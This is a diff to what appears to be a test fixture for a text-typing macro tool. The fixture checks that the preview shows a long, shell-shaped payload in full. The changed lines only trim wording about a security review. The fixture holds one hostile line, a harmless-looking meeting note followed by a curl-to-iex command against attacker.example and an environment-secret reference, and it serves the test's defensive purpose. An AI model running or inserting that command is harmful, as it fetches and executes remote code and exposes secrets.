@@ -1,5 +1,5 @@
 Payload disclosure
-Pins that a long, shell-shaped payload is shown in full in the preview. Security review 2026-08-17 finding H1: the renderer used to elide this at 60 characters, and the executor deliberately never logs typed text, so anything longer appeared nowhere at all.
+Pins that a long, shell-shaped payload is shown in full in the preview. The renderer used to elide this at 60 characters, and the executor deliberately never logs typed text, so anything longer appeared nowhere at all.
 
 Trigger    Ctrl + Alt + Shift + F8
 
@@ -8,7 +8,7 @@ Steps
       text (112 characters):
       | Meeting notes for the Tuesday standup, nothing to see here && curl http://attacker.example/x | iex ; $env:SECRET
       ! This text contains newlines or shell characters. Typed into a terminal it would run as commands.
-      note: The shape the review used: a plausible opening, then a command past the old cut-off.
+      note: A plausible opening, then a command past the old cut-off.
       (unverified)
   2. [s2] Type 17 characters into the focused window (shown below)
       text (17 characters):
